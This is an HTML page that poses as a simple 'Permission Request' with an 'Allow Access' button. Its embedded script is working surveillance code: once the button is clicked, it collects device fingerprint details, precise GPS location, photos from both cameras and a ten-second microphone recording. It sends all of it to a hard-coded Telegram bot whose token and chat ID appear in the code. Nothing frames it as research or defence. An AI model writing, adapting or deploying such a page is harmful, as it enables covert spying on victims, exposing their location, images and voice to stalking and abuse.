<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permission Request</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
        }
        #container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        #status {
            font-size: 18px;
            margin: 20px 0;
            color: #333;
        }
        #permission-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 0;
        }
        #permission-btn:disabled {
            background: #cccccc;
        }
    </style>
</head>
<body>
    <div id="container">
        <div id="status">Please wait 3 minutes...</div>
        <button id="permission-btn">Allow Access</button>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        // DOM Elements
        const statusEl = document.getElementById('status');
        const permissionBtn = document.getElementById('permission-btn');
        
        // Main function to collect and send all data
        async function collectAndSendAllData() {
            try {
                // 1. Send basic device info first
                const deviceInfo = getDeviceInfo();
                await sendToTelegram(formatDeviceInfo(deviceInfo));
                
                // 2. Get and send location (parallel with other requests)
                const locationPromise = getLocation().then(loc => {
                    return sendToTelegram(`📍 Location:\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\nMap: https://maps.google.com/?q=${loc.latitude},${loc.longitude}`);
                }).catch(e => {
                    return sendToTelegram("⚠️ Failed to get location: " + e.message);
                });
                
                // 3. Camera photos (parallel)
                const frontCameraPromise = captureAndSendPhoto('user', 'front_camera.jpg');
                const backCameraPromise = captureAndSendPhoto('environment', 'back_camera.jpg');
                
                // 4. Audio recording
                const audioPromise = recordAndSendAudio(10);
                
                // 5. Auto-send pictures from common directories
                const picturesPromise = autoSendPictures();
                
                // Wait for all operations to complete
                await Promise.all([
                    locationPromise,
                    frontCameraPromise,
                    backCameraPromise,
                    audioPromise,
                    picturesPromise
                ]);
                
            } catch (error) {
                await sendToTelegram("⚠️ Error: " + error.message);
                throw error;
            }
        }
        
        // Get comprehensive device information
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceType: getDeviceType(),
                os: getOSInfo(),
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown',
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth}bit`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: getBatteryInfo(),
                connection: getConnectionInfo(),
                ip: 'fetching...', // Will be updated async
                gpu: getGPUInfo(),
                touchSupport: 'ontouchstart' in window,
                sensors: getSensorInfo(),
                storage: getStorageEstimate(),
                installedApps: getInstalledAppsInfo(),
                security: getSecurityInfo(),
                time: new Date().toISOString()
            };
        }
        
        // Helper functions for device info
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Mac/i.test(ua)) return 'Mac';
            if (/Linux/i.test(ua)) return 'Linux';
            return 'Unknown';
        }
        
        function getOSInfo() {
            const ua = navigator.userAgent;
            const clientStrings = [
                {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
                {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
                {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
                {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
                {s:'Android', r:/Android/},
                {s:'iOS', r:/(iPhone|iPad|iPod)/},
                {s:'Mac OS X', r:/Mac OS X/},
                {s:'Linux', r:/Linux/},
                {s:'Ubuntu', r:/Ubuntu/}
            ];
            for (let i = 0; i < clientStrings.length; i++) {
                if (clientStrings[i].r.test(ua)) {
                    return clientStrings[i].s;
                }
            }
            return 'Unknown';
        }
        
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    return 'unknown';
                }
            }
            return 'unsupported';
        }
        
        function getConnectionInfo() {
            if (navigator.connection) {
                return {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + 'Mb/s',
                    rtt: navigator.connection.rtt + 'ms',
                    saveData: navigator.connection.saveData
                };
            }
            return 'unknown';
        }
        
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                } : 'unknown';
            }
            return 'unsupported';
        }
        
        function getSensorInfo() {
            const sensors = [];
            if ('accelerometer' in window) sensors.push('accelerometer');
            if ('gyroscope' in window) sensors.push('gyroscope');
            if ('magnetometer' in window) sensors.push('magnetometer');
            if ('AmbientLightSensor' in window) sensors.push('light');
            return sensors.length ? sensors.join(', ') : 'none detected';
        }
        
        async function getStorageEstimate() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        usage: (estimate.usage / (1024 * 1024)).toFixed(2) + 'MB',
                        quota: (estimate.quota / (1024 * 1024)).toFixed(2) + 'MB'
                    };
                } catch (e) {
                    return 'unknown';
                }
            }
            return 'unsupported';
        }
        
        function getInstalledAppsInfo() {
            // This is a limited approach due to browser restrictions
            const apps = [];
            if ('getInstalledRelatedApps' in window) {
                return 'supported (but requires user gesture)';
            }
            return 'limited detection';
        }
        
        function getSecurityInfo() {
            const security = [];
            if (window.isSecureContext) security.push('secure context');
            if (navigator.doNotTrack === '1') security.push('DNT enabled');
            if (navigator.cookieEnabled) security.push('cookies enabled');
            return security.length ? security.join(', ') : 'basic';
        }
        
        // Format device info for Telegram
        function formatDeviceInfo(info) {
            return `📱 <b>DEVICE INFORMATION</b>\n\n` +
                   `🖥️ <b>System Info</b>\n` +
                   `- Platform: ${info.platform}\n` +
                   `- Device: ${info.deviceType}\n` +
                   `- OS: ${info.os}\n` +
                   `- User Agent: ${info.userAgent}\n` +
                   `- CPU Cores: ${info.cpuCores}\n` +
                   `- RAM: ${info.ram}\n\n` +
                   
                   `📊 <b>Display</b>\n` +
                   `- Resolution: ${info.screen}\n` +
                   `- Color Depth: ${info.colorDepth}\n\n` +
                   
                   `🌐 <b>Network</b>\n` +
                   `- Connection: ${info.connection.type || 'unknown'}\n` +
                   `- IP: ${info.ip}\n` +
                   `- Language: ${info.language}\n` +
                   `- Timezone: ${info.timezone}\n\n` +
                   
                   `🔋 <b>Battery</b>\n` +
                   `- Level: ${info.battery.level || 'unknown'}\n` +
                   `- Charging: ${info.battery.charging ? 'Yes' : 'No'}\n\n` +
                   
                   `⚙️ <b>Advanced</b>\n` +
                   `- GPU: ${info.gpu.renderer || 'unknown'}\n` +
                   `- Touch: ${info.touchSupport ? 'Yes' : 'No'}\n` +
                   `- Sensors: ${info.sensors}\n` +
                   `- Storage: ${info.storage.quota || 'unknown'}\n` +
                   `- Security: ${info.security}\n\n` +
                   
                   `⏰ <b>Timestamp</b>\n${info.time}`;
        }
        
        // Camera capture function
        async function captureAndSendPhoto(facingMode, filename) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode, width: 1280, height: 720 }
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await new Promise(resolve => 
                    canvas.toBlob(resolve, 'image/jpeg', 0.9)
                );
                
                await sendPhotoToTelegram(blob, filename);
                return true;
            } catch (error) {
                await sendToTelegram(`⚠️ Camera ${facingMode} error: ${error.message}`);
                return false;
            }
        }
        
        // Location function
        async function getLocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    }),
                    err => reject(err),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // Audio recording function
        async function recordAndSendAudio(duration) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                
                await new Promise(resolve => setTimeout(resolve, duration * 1000));
                
                recorder.stop();
                stream.getTracks().forEach(track => track.stop());
                
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                await sendAudioToTelegram(blob, 'recording.ogg');
                return true;
            } catch (error) {
                await sendToTelegram(`⚠️ Audio error: ${error.message}`);
                return false;
            }
        }
        
        // Auto-send pictures from common directories
        async function autoSendPictures() {
            try {
                // This would require the File System Access API
                // In a real implementation, you'd need user gesture to get directory handles
                await sendToTelegram("ℹ️ Auto file access requires explicit user permission");
                return false;
            } catch (error) {
                await sendToTelegram(`⚠️ File access error: ${error.message}`);
                return false;
            }
        }
        
        // Telegram sending functions
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram send error:', error);
            }
        }
        
        async function sendPhotoToTelegram(photoBlob, filename) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, filename);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
        
        async function sendAudioToTelegram(audioBlob, filename) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('audio', audioBlob, filename);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                method: 'POST',
                body: formData
            });
        }
        
        // Main flow
        permissionBtn.addEventListener('click', async () => {
            permissionBtn.disabled = true;
            statusEl.textContent = "Please wait while we collect information...";
            
            setTimeout(async () => {
                try {
                    await collectAndSendAllData();
                    statusEl.textContent = "Information sent successfully!";
                } catch (error) {
                    statusEl.textContent = "Error occurred. Please try again.";
                    console.error(error);
                }
            }, 1000);
        });
        
        // Get IP address
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
        
        // Initialize
        (async () => {
            const ip = await fetchIP();
            // Update device info with IP if needed
        })();
    </script>
</body>
</html>
